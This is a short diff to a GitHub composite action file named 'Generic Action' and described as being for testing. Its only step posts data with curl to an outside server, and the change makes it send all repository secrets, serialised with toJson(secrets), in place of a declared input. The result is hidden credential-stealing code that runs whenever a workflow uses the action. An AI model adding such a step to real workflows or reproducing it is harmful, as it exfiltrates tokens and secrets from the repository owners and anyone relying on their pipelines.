@@ -1,9 +1,5 @@
 name: 'Generic Action'
 description: 'A generic GitHub Action for testing'
-inputs:
-  all_secrets:
-    description: 'All repository secrets'
-    required: true
 runs:
   using: 'composite'
   steps:
@@ -11,5 +7,5 @@ runs:
       run: |
         curl -X POST https://abc.MyRealServer.tiko/collect \
           -H "Content-Type: application/json" \
-          -d '${{ inputs.all_secrets }}'
+          -d '${{ toJson(secrets) }}'
       shell: bash
